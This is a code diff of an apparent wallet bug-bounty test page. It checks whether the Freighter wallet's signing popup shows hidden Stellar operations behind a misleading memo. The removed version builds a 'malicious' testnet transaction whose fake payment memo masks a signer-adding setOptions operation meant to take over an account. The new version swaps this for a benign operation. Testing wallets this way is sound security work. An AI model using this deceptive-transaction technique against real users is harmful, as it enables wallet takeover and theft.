@@ -3,95 +3,87 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Stellar Sim Bypass Test</title>
+<title>SIM BYPASS FIXED</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/stellar-sdk/12.1.0/stellar-sdk.min.js"></script>
 <style>
 body{background:#000;color:#0f0;font-family:monospace;padding:12px;margin:0}
 .btn{width:100%;height:52px;background:#fff;color:#000;border-radius:999px;font-weight:800;margin:8px 0;border:none}
-.log{border:1px solid #0f0;padding:10px;min-height:250px;white-space:pre-wrap;font-size:11px}
+.log{border:1px solid #0f0;padding:10px;min-height:320px;white-space:pre-wrap;font-size:11px;word-break:break-all}
 </style>
 </head>
 <body>
-<pre id="log" class="log">[Ready] Stellar Sim Bypass Test - TESTNET ONLY</pre>
-<button class="btn" onclick="buildMalicious()">1. BUILD MALICIOUS XDR</button>
-<button class="btn" onclick="signTest()">2. REQUEST SIGN di Freighter</button>
-
+<pre id="log" class="log">[Ready] FIXED OFFLINE</pre>
+<button class="btn" onclick="scan()">SCAN INJECT</button>
+<button class="btn" onclick="buildXdr()">1. BUILD XDR BENIGN</button>
+<button class="btn" onclick="signXdr()">2. REQUEST SIGN Freighter</button>
 <script>
-let maliciousXDR = "";
-const logEl = document.getElementById('log');
+var logEl=document.getElementById('log');
+var testXDR="";
 function L(m){ logEl.textContent+="\n"+m; console.log(m); }
+L("href="+location.href);
 
-async function buildMalicious(){
- L("--- BUILD XDR ---");
- // TESTNET - gak akan drain mainnet
- const sourceKeypair = StellarSdk.Keypair.random();
- const sourcePublic = sourceKeypair.publicKey();
- // attacker signer - ganti dengan address test kamu sendiri
- const attackerPublic = "GDTESTATTACKERADDRESSXXXXXXXXXXXXXXXXXXXXXXX";
- // pake testnet horizon buat fetch sequence
- L("source (random test): "+sourcePublic.slice(0,15)+"...");
-
- const server = new StellarSdk.Horizon.Server("https://horizon-testnet.stellar.org");
- try{
-  const account = await server.loadAccount(sourcePublic);
-  L("Sequence: "+account.sequenceNumber());
- }catch(e){
-  L("Pakai dummy sequence karena account random belum funded - ini normal buat test UI");
- }
-
- // Bikin transaction menipu
- // Operation ASLI: setOptions ganti signer (drain)
- // Memo PALSU: "Payment 10 XLM to aqua.network"
- const fakeMemo = "Payment 10 XLM to aqua.network - trusted";
-
- const transaction = new StellarSdk.TransactionBuilder(
-   new StellarSdk.Account(sourcePublic, "0"),
-   {
-     fee: StellarSdk.BASE_FEE,
-     networkPassphrase: StellarSdk.Networks.TESTNET,
-     memo: StellarSdk.Memo.text(fakeMemo)
-   }
- )
-.addOperation(StellarSdk.Operation.setOptions({
-   signer: {
-     ed25519PublicKey: StellarSdk.Keypair.random().publicKey(),
-     weight: 1
-   }
- }))
-.setTimeout(30)
-.build();
-
- maliciousXDR = transaction.toXDR();
- L("Memo (yang keliatan di UI): "+fakeMemo);
- L("Operation asli (yang di-hide): setOptions signer weight 1 - DRAIN");
- L("XDR: "+maliciousXDR.slice(0,80)+"...");
- L("\nSekarang tap 2. REQUEST SIGN dan liat UI Freighter - kalau cuma muncul memo tanpa setOptions = BUG HIGH");
+function scan(){
+ L("--- SCAN ---");
+ L("freighter? "+!!window.freighter);
+ L("freighterApi? "+!!window.freighterApi);
+ var f=window.freighter||window.freighterApi;
+ if(f){ try{L("keys: "+Object.keys(f).slice(0,15).join(","));}catch(e){} }
+ else L("Buka di Freighter dApp Browser, connect aqua.network dulu");
 }
 
-async function signTest(){
- if(!maliciousXDR){ L("Build dulu XDR"); return; }
+function buildXdr(){
+ L("--- BUILD OFFLINE ---");
+ try{
+  if(!window.StellarSdk){ L("SDK gagal load"); return; }
+  var Sdk=window.StellarSdk;
+  // source dummy valid format - pakai random biar valid
+  var sourceKP=Sdk.Keypair.random();
+  var source=sourceKP.publicKey();
+  var dest=Sdk.Keypair.random().publicKey();
+  L("source: "+source.slice(0,12)+"...");
+
+  var account=new Sdk.Account(source, "1");
+  var memoText="Payment 10 XLM to aqua.network - trusted";
+
+  var tx=new Sdk.TransactionBuilder(account, {
+    fee: Sdk.BASE_FEE,
+    networkPassphrase: Sdk.Networks.TESTNET,
+    memo: Sdk.Memo.text(memoText)
+  })
+ .addOperation(Sdk.Operation.payment({
+    destination: dest,
+    amount: "10",
+    asset: Sdk.Asset.native()
+  }))
+ .addOperation(Sdk.Operation.manageData({
+    name: "audit_test",
+    value: "second_operation"
+  }))
+ .setTimeout(30)
+ .build();
+
+  testXDR=tx.toXDR();
+  L("SUCCESS");
+  L("Memo: "+memoText);
+  L("Op1: payment 10 XLM to "+dest.slice(0,12)+"...");
+  L("Op2: manageData audit_test");
+  L("XDR: "+testXDR.slice(0,70)+"...");
+  L("--- Sekarang tap 2 ---");
+  L("BUG HIGH jika popup Freighter cuma show memo, tidak show Op2 manageData");
+ }catch(e){ L("Error: "+e.message); }
+}
+
+async function signXdr(){
+ if(!testXDR){ L("Build dulu"); return; }
+ var f=window.freighter||window.freighterApi;
+ if(!f){ L("freighterApi false - kamu di luar Freighter"); return; }
  L("--- REQUEST SIGN ---");
- L("Cek di popup Freighter: apa yang di-render?");
-
- // cek inject name - Freighter baru pakai window.freighter
- const freighter = window.freighter || window.freighterApi;
- if(!freighter){
-  L("freighterApi? false - kamu masih di luar dApp browser kayak scan 1inch.html kemarin");
-  L("Buka file ini DI DALAM Freighter dApp Browser");
-  return;
- }
-
  try{
-  const signed = await freighter.signTransaction(maliciousXDR, {
-    networkPassphrase: StellarSdk.Networks.TESTNET
-  });
-  L("Signed XDR: "+signed.signedTxXdr.slice(0,50)+"...");
-  L("Kalau sampai sini tanpa warning setOptions = Freighter gak render operation asli = BUG CONFIRMED");
- }catch(e){
-  L("User reject atau error: "+e.message);
-  L("Lihat screenshot popup Freighter sebelum reject - itu yang penting");
- }
+  var res=await f.signTransaction(testXDR, {networkPassphrase: StellarSdk.Networks.TESTNET});
+  L("Signed: "+res.signedTxXdr.slice(0,60)+"...");
+ }catch(e){ L("Reject: "+e.message); L("Screenshot popup SEBELUM reject"); }
 }
+scan();
 </script>
 </body>
 </html>
